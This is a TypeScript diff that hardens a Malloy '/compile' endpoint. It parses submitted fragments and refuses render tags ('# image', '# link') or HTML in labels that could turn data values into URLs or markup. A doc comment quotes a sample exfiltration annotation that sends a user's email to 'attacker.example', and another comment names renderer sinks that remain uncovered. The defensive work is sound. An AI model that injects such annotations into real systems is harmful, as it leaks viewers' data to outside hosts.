@@ -2,8 +2,11 @@
 // SPDX-License-Identifier: MIT
 
 import type { LogMessage, Model, Runtime } from "@malloydata/malloy";
-import { Malloy, MalloyError } from "@malloydata/malloy";
+import { Malloy, MalloyError, MalloyTranslator } from "@malloydata/malloy";
+import { parseAnnotation, type Tag } from "@malloydata/malloy-tag";
+import type { ParseTree } from "antlr4ts/tree/ParseTree";
 import { CompileRefusedError, UnparseableTextError } from "../errors";
+import { hasEnvReference, motlyAnnotations, tagText } from "./motly";
 
 /**
  * Construct containment for caller-submitted `/compile` text.
@@ -68,74 +71,87 @@ function restrictedRejections(problems: readonly LogMessage[]): LogMessage[] {
  * `# image pic is concat('https://attacker.example/p?d=', email)` sends the
  * value the viewer may read to a host of the caller's choosing. A model's own
  * fields keep them (the modeler is trusted); a fragment may not write them.
- * `@malloydata/render` reads no other tag as a URL.
  *
- * This is a text scan, unlike the compiler-decided constructs above, because
- * Malloy does not classify annotations: it passes them through verbatim. The
- * scan reads annotations the way the lexer finds them (outside strings and
- * comments, to the end of the line) and runs before anything compiles, so the
- * answer is the same whether or not the data behind the query exists.
+ * Malloy passes annotations through verbatim and the renderer reads them with
+ * the MOTLY tag parser, so this reads them the same way: the fragment is
+ * PARSED (no schema, no connection, so the answer cannot depend on whether the
+ * data exists), every `#` and `#|` annotation is collected from the parse tree,
+ * and each is parsed as MOTLY. Quoting, backticks, escapes, blocks and a field
+ * named `link` used as a value all fall out of that, which a text match cannot
+ * promise. Only the single-hash forms are field tags; `##` notes describe the
+ * model and are never drawn.
+ *
+ * Not covered here: renderer sinks that take a data value with no tag (a chart
+ * axis label measured through `innerHTML`, pivot headers). Those are the
+ * renderer's to fix, and a host content-security-policy is the backstop.
  */
-const URL_RENDER_TAG = /(?:^|[\s{},.[])(image|link)(?![\w])/;
-const HTML_IN_LABEL =
-   /\blabel\s*=\s*(?:"[^"]*<\s*[A-Za-z!/][^"]*"|'[^']*<\s*[A-Za-z!/][^']*')/;
+const FIELD_ANNOTATION = /^#(?!#)/;
+const HTML_START = /<[A-Za-z!/]/;
 
-/** The text of every `#` annotation in `source`, found outside strings, comments and `##|` blocks. */
-function annotationTexts(source: string): string[] {
+/** The text of every single-hash annotation in `source`, collected from its parse. */
+function fieldAnnotationTexts(source: string): string[] {
+   const url = "internal://render-tag-scan.malloy";
+   const translator = new MalloyTranslator(url, null, {
+      urls: { [url]: source },
+   });
+   const parsed = translator.parseStep.step(translator).parse;
    const found: string[] = [];
-   const end = source.length;
-   const lineEnd = (from: number) => {
-      const at = source.indexOf("\n", from);
-      return at === -1 ? end : at;
-   };
-   let i = 0;
-   while (i < end) {
-      const c = source[i];
-      const next = source[i + 1];
-      if (c === "'" || c === '"' || c === "`") {
-         i++;
-         while (i < end && source[i] !== c) i += source[i] === "\\" ? 2 : 1;
-         i++;
-      } else if ((c === "/" && next === "/") || (c === "-" && next === "-")) {
-         i = lineEnd(i);
-      } else if (c === "/" && next === "*") {
-         const close = source.indexOf("*/", i + 2);
-         i = close === -1 ? end : close + 2;
-      } else if (c === "#") {
-         const stop = lineEnd(i);
-         if (source.startsWith("##|", i)) {
-            // A block's prose is free text, apostrophes included, up to its closer.
-            const close = source.indexOf("|##", i + 3);
-            i = close === -1 ? end : close + 3;
-            continue;
+   const walk = (node: ParseTree) => {
+      if (node.constructor.name === "AnnotationContext") {
+         const text = node.text;
+         // A block's closer is not part of its content; text after a missing one is, so it is scanned too.
+         if (FIELD_ANNOTATION.test(text)) {
+            found.push(text.replace(/\n[ \t]*\|#\s*$/, "\n"));
          }
-         found.push(source.slice(i, stop));
-         i = stop;
-      } else {
-         i++;
+         return;
+      }
+      for (let i = 0; i < node.childCount; i++) walk(node.getChild(i));
+   };
+   if (parsed?.root) walk(parsed.root as ParseTree);
+   return found;
+}
+
+/** The first property in `tag` that is a URL-producing render tag, or markup in a `label`. */
+function offendingTag(tag: Tag): string | undefined {
+   for (const [name, child] of tag.entries()) {
+      if (child.deleted) continue;
+      if (name === "image" || name === "link") return `# ${name}`;
+      if (name === "label") {
+         const label = tagText(tag, "label");
+         if (label !== undefined && HTML_START.test(label)) {
+            return "HTML in a `# label`";
+         }
+      }
+      const elements = Array.isArray(child.eq) ? child.eq : [];
+      for (const nested of [child, ...elements]) {
+         const found = offendingTag(nested);
+         if (found) return found;
       }
    }
-   return found;
+   return undefined;
 }
 
 /** The refusal for a fragment that writes a render tag turning a value into a URL or markup, if it does. */
 function renderTagRefusal(source: string): string | undefined {
-   for (const text of annotationTexts(source)) {
-      // A routed note (`#(authorize)`, `#"`) is not a render tag.
-      if (/^#+[("]/.test(text)) continue;
-      const bare = text.replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, '""');
-      const tag = URL_RENDER_TAG.exec(bare)?.[1];
-      if (tag) {
-         return (
-            `the submitted text writes the render tag \`# ${tag}\`, which turns a value into a ` +
-            `URL the viewer's browser would load. Fix: define the field in the model file ` +
-            `itself, where a modeler owns what it links to.`
-         );
+   for (const text of fieldAnnotationTexts(source)) {
+      // An env reference is hydrated from the server's environment by the parser; it is neutralized, not read.
+      const safe = hasEnvReference(text)
+         ? text.replaceAll("@env.", "@x.")
+         : text;
+      // `#(docs)`, `#"` and the other routes are prose or another namespace, not render tags.
+      if (motlyAnnotations([safe]).length === 0) continue;
+      let tag: Tag;
+      try {
+         tag = parseAnnotation(safe).tag;
+      } catch {
+         continue;
       }
-      if (HTML_IN_LABEL.test(text)) {
+      const found = offendingTag(tag);
+      if (found) {
          return (
-            `the submitted text writes HTML in a \`# label\`, which the renderer draws as markup. ` +
-            `Fix: use plain text, or define the label in the model file itself.`
+            `the submitted text writes ${found === "HTML in a `# label`" ? found : `the render tag \`${found}\``}, ` +
+            `which the viewer's browser would load or draw as markup. Fix: define the field in the ` +
+            `model file itself, where a modeler owns what it links to.`
          );
       }
    }
